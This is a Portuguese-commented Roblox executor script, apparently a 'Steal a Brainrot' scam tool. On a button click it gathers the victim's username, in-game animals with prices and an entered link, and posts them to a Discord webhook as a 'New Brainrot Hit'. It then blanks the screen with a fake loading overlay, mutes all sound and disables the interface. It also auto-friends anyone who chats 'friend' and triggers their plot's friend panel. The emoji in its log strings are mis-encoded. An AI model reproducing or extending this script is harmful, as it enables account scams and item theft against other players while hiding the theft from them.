local function setupChatListeners()
    Players.PlayerChatted:Connect(function(_, chatPlayer, message)
        local msg = normalize(message)
        
        -- Sistema de Friend
        if msg == "friend" then
            if chatPlayer.Name == player.Name then return end
            
            print("üì¢ Pedido de friend detectado de:", chatPlayer.Name)
            
            -- Tenta adicionar como amigo
            tryAddFriend(chatPlayer)
            
            -- Encontra o plot da pessoa
            local plotsFolder = workspace:FindFirstChild("Plots")
            local targetPlot = findPlayerPlot(plotsFolder, chatPlayer.Name)
            
            if not targetPlot then
                print("‚ùå Plot de", chatPlayer.Name, "n√£o encontrado")
                return
            end
            
            print("‚úÖ Plot encontrado:", targetPlot.Name)
            
            -- Procura o FriendPanel
            local friendPanel = targetPlot:FindFirstChild("FriendPanel")
            if not friendPanel then
                print("‚ùå FriendPanel n√£o encontrado no plot")
                return
            end
            
            print("‚úÖ FriendPanel encontrado")
            
            -- Procura a Part Main
            local mainPart = friendPanel:FindFirstChild("Main")
            if not mainPart or not mainPart:IsA("BasePart") then
                print("‚ùå Part Main n√£o encontrada no FriendPanel")
                return
            end
            
            print("‚úÖ Main part encontrada, indo at√© l√°...")
            
            -- Anda at√© a posi√ß√£o
            local success = walkToPosition(mainPart.Position)
            
            if success then
                print("‚úÖ Chegou na posi√ß√£o!")
                wait(0.5)
                
                -- Procura e ativa o ProximityPrompt
                local proximityPrompt = mainPart:FindFirstChildOfClass("ProximityPrompt")
                if proximityPrompt then
                    print("‚úÖ ProximityPrompt encontrado, ativando...")
                    fireproximityprompt(proximityPrompt)
                    print("‚úÖ ProximityPrompt ativado!")
                else
                    print("‚ùå ProximityPrompt n√£o encontrado")
                end
            else
                print("‚ùå N√£o conseguiu chegar na posi√ß√£o")
            end
        end
    end)
end

--// On Click
button.MouseButton1Click:Connect(function()
    local input = textbox.Text
    
    print("üîò Bot√£o clicado!")
    print("üìù Input:", input)
    
    -- Desabilita o bot√£o temporariamente
    button.Text = "Enviando..."
    button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    local currentTime = os.date("%H:%M - %d/%m/%Y")
    local totalPlayers = #Players:GetPlayers()
    
    print("‚è∞ Hora:", currentTime)
    print("üë• Total de jogadores:", totalPlayers)

    -- Encontra o plot do jogador
    local plotsFolder = workspace:FindFirstChild("Plots")
    print("üìÅ Plots folder:", plotsFolder and "Encontrado" or "N√£o encontrado")
    
    local targetPlot = findPlayerPlot(plotsFolder, player.Name)
    print("üè† Plot do jogador:", targetPlot and targetPlot.Name or "N√£o encontrado")
    
    -- Pega os animais com seus pre√ßos
    local foundAnimals = getAnimalsInPlot(targetPlot)

    -- Debug
    print("üîç Plot encontrado:", targetPlot and "sim" or "n√£o")
    for _, animal in ipairs(foundAnimals) do
        print("üìù Animal:", animal.name, "->", animal.price)
    end

    -- Monta o texto para a webhook
    local brainrotsValue
    if not targetPlot then
        brainrotsValue = "Plot n√£o encontrado"
    elseif #foundAnimals == 0 then
        brainrotsValue = "Nenhum"
    else
        local parts = {}
        for _, animal in ipairs(foundAnimals) do
            table.insert(parts, animal.name .. " (" .. animal.price .. ")")
        end
        brainrotsValue = table.concat(parts, "\n")
    end

    -- Payload formatado com sintaxe corrigida
    local payload = {
        ["content"] = "@everyone **New Brainrot Hit**",
        ["username"] = "Brainrot System",
        ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
        ["embeds"] = {
            {
                ["title"] = "üìä Brainrots Normais",
                ["color"] = 8405759,
                ["fields"] = {
                    {
                        ["name"] = "üìÖ Data",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üîó Link/Texto",
                        ["value"] = input or "Nenhum texto",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üë• Jogando",
                        ["value"] = tostring(totalPlayers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üë§ Nome",
                        ["value"] = player.Name,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üéÆ Brainrots",
                        ["value"] = brainrotsValue,
                        ["inline"] = false
                    }
                }
            }
        }
    }

    -- Tenta enviar a webhook com tratamento de erro melhorado
    print("üì§ Tentando enviar webhook...")
    print("üîó URL:", WEBHOOK_URL)
    
    local success, response = pcall(function()
        local encoded = HttpService:JSONEncode(payload)
        print("‚úÖ JSON encoded com sucesso")
        print("üì¶ Tamanho do payload:", #encoded, "bytes")
        
        local result = HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encoded
        })
        
        print("‚úÖ Request completado!")
        return result
    end)

    if success then
        print("‚úÖ‚úÖ‚úÖ Webhook enviada com sucesso!")
        print("üìä Response:", tostring(response))
        
        button.Text = "‚úÖ Enviado!"
        button.BackgroundColor3 = Color3.fromRGB(40, 200, 40)
        textbox.Text = "‚úÖ Enviado com sucesso!"
        wait(2)
        textbox.Text = ""
        button.Text = "Prosseguir"
        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
        
        -- Setup chat listeners (friend)
        setupChatListeners()
        
        -- Create loading screen
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = CoreGui

        local frame = Instance.new("Frame")
        frame.Parent = ScreenGui
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundTransparency = 0
        frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
        textLabel.Text = "Loading..."
        textLabel.TextSize = 28
        textLabel.Parent = frame

        local loadingRing = Instance.new("ImageLabel")
        loadingRing.Size = UDim2.new(0, 256, 0, 256)
        loadingRing.BackgroundTransparency = 1
        loadingRing.Image = "rbxassetid://4965945816"
        loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
        loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
        loadingRing.Parent = frame

        -- Create spinning animation
        local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
        local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
        tween:Play()

        -- Mute all sounds
        for _, sound in ipairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end

        -- Disable CoreGui
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    else
        warn("‚ùå‚ùå‚ùå ERRO AO ENVIAR WEBHOOK!")
        warn("‚ùå Erro:", tostring(response))
        
        button.Text = "‚ùå Erro!"
        button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
        textbox.Text = "‚ùå Erro: " .. tostring(response)
        wait(3)
        textbox.Text = ""
        button.Text = "Prosseguir"
        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
    end
end)
